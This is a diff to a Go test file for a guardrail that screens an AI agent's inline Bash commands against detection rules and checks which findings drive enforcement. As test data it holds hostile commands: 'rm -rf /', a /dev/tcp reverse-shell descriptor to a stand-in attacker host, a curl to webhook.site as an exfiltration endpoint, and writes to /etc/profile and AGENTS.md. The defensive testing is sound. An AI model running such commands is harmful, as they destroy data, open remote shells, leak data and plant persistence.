@@ -129,22 +129,25 @@ func TestBashInlineStrongerOwnersRemainEnforceable(t *testing.T) {
 	installIssue708ProfileConnector(t, connector, "default")
 
 	for _, test := range []struct {
-		name          string
-		command       string
-		ruleID        string
-		authoritative bool
+		name                 string
+		command              string
+		ruleID               string
+		authoritative        bool
+		wantOwnerEnforcement bool
 	}{
 		{
-			name:          "destructive child",
-			command:       `bash -c 'rm -rf /'`,
-			ruleID:        "CMD-RM-RF",
-			authoritative: true,
+			name:                 "destructive child",
+			command:              `bash -c 'rm -rf /'`,
+			ruleID:               "CMD-RM-RF",
+			authoritative:        true,
+			wantOwnerEnforcement: true,
 		},
 		{
-			name:          "structured dev tcp descriptor",
-			command:       `bash -c 'exec 5<>/dev/tcp/attacker.invalid/4444'`,
-			ruleID:        "CMD-REVSHELL-DEVTCP",
-			authoritative: true,
+			name:                 "structured dev tcp descriptor",
+			command:              `bash -c 'exec 5<>/dev/tcp/attacker.invalid/4444'`,
+			ruleID:               "CMD-REVSHELL-DEVTCP",
+			authoritative:        true,
+			wantOwnerEnforcement: true,
 		},
 		{
 			name: "nested bidirectional dev tcp shell",
@@ -165,10 +168,11 @@ func TestBashInlineStrongerOwnersRemainEnforceable(t *testing.T) {
 			ruleID: "CMD-REVSHELL-DEVTCP",
 		},
 		{
-			name:          "system startup profile mutation",
-			command:       `bash -c 'printf x | tee -a /etc/profile'`,
-			ruleID:        "persistence.shell_profile_write",
-			authoritative: true,
+			name:                 "system startup profile mutation",
+			command:              `bash -c 'printf x | tee -a /etc/profile'`,
+			ruleID:               "persistence.shell_profile_write",
+			authoritative:        true,
+			wantOwnerEnforcement: true,
 		},
 		{
 			name:          "sensitive path",
@@ -177,16 +181,18 @@ func TestBashInlineStrongerOwnersRemainEnforceable(t *testing.T) {
 			authoritative: true,
 		},
 		{
-			name:          "known exfil destination",
-			command:       `bash -c 'curl https://webhook.site/example'`,
-			ruleID:        "C2-WEBHOOK-SITE",
-			authoritative: true,
+			name:                 "known exfil destination",
+			command:              `bash -c 'curl https://webhook.site/example'`,
+			ruleID:               "C2-WEBHOOK-SITE",
+			authoritative:        true,
+			wantOwnerEnforcement: true,
 		},
 		{
-			name:          "cognitive file mutation",
-			command:       `bash -c 'printf x > /repo/AGENTS.md'`,
-			ruleID:        "COG-AGENTS-MD",
-			authoritative: true,
+			name:                 "cognitive file mutation",
+			command:              `bash -c 'printf x > /repo/AGENTS.md'`,
+			ruleID:               "COG-AGENTS-MD",
+			authoritative:        true,
+			wantOwnerEnforcement: true,
 		},
 	} {
 		t.Run(test.name, func(t *testing.T) {
@@ -196,6 +202,7 @@ func TestBashInlineStrongerOwnersRemainEnforceable(t *testing.T) {
 			}
 			input := actionfacts.Input{
 				Tool: "Bash", Args: args, CWD: "/repo", ActiveHome: "/home/alice",
+				ActiveAgentFiles: []string{"/repo/AGENTS.md"},
 			}
 			facts := actionfacts.Analyze(input)
 			if got := facts.Authoritative(); got != test.authoritative {
@@ -215,17 +222,22 @@ func TestBashInlineStrongerOwnersRemainEnforceable(t *testing.T) {
 			)
 			generic := findingWithID(verdict.DetailedFindings, "CMD-BASH-C")
 			owner := findingWithID(verdict.DetailedFindings, test.ruleID)
-			if generic == nil || owner == nil || !owner.contributesToEnforcement() {
+			if generic == nil || owner == nil {
 				t.Fatalf(
-					"verdict = %+v, generic = %+v, owner = %+v, want retained enforceable owner",
+					"verdict = %+v, generic = %+v, owner = %+v, want retained owner finding",
 					verdict, generic, owner,
 				)
 			}
-			wantGenericEnforcement := !test.authoritative
-			if got := generic.contributesToEnforcement(); got != wantGenericEnforcement {
+			if got := owner.contributesToEnforcement(); got != test.wantOwnerEnforcement {
 				t.Fatalf(
-					"generic enforcement = %t, want %t with authoritative=%t: %+v",
-					got, wantGenericEnforcement, test.authoritative, *generic,
+					"owner enforcement = %t, want %t: %+v",
+					got, test.wantOwnerEnforcement, *owner,
+				)
+			}
+			if generic.contributesToEnforcement() {
+				t.Fatalf(
+					"generic Bash shape crossed proof boundary: %+v",
+					*generic,
 				)
 			}
 		})
@@ -270,7 +282,7 @@ func TestBashInlineDemotionPreservesUncertaintyLiteralsAndOtherInterpreters(t *t
 			legacy:          `env MODE=check bash -c 'printf ok'`,
 			ruleID:          "CMD-BASH-C",
 			wantMatch:       true,
-			wantEnforcement: true,
+			wantEnforcement: false,
 		},
 	} {
 		t.Run(test.name, func(t *testing.T) {
@@ -292,7 +304,7 @@ func TestBashInlineDemotionPreservesUncertaintyLiteralsAndOtherInterpreters(t *t
 	}
 }
 
-func TestBashInlineCustomRuleWithBuiltinIDRemainsEnforceable(t *testing.T) {
+func TestBashInlineCustomRuleWithBuiltinIDRemainsVisibleButUnproven(t *testing.T) {
 	const connector = "issue-708-bash-custom-owner"
 	installIssue708ProfileConnector(t, connector, "default")
 	pack := mustLoadRulePack(t, filepath.Join(guardrailPoliciesRoot(t), "default"))
@@ -326,10 +338,10 @@ func TestBashInlineCustomRuleWithBuiltinIDRemainsEnforceable(t *testing.T) {
 		LegacyText: command, Connector: connector, EnforcementCapable: true,
 	})
 	matched := findingWithID(findings, "CMD-BASH-C")
-	if matched == nil || !matched.contributesToEnforcement() ||
+	if matched == nil || matched.contributesToEnforcement() ||
 		matched.Title != "Operator-owned Bash policy" ||
 		matched.Severity != "CRITICAL" {
-		t.Fatalf("custom CMD-BASH-C was demoted by reused ID: %+v", matched)
+		t.Fatalf("custom CMD-BASH-C crossed proof boundary or lost visibility: %+v", matched)
 	}
 }
 
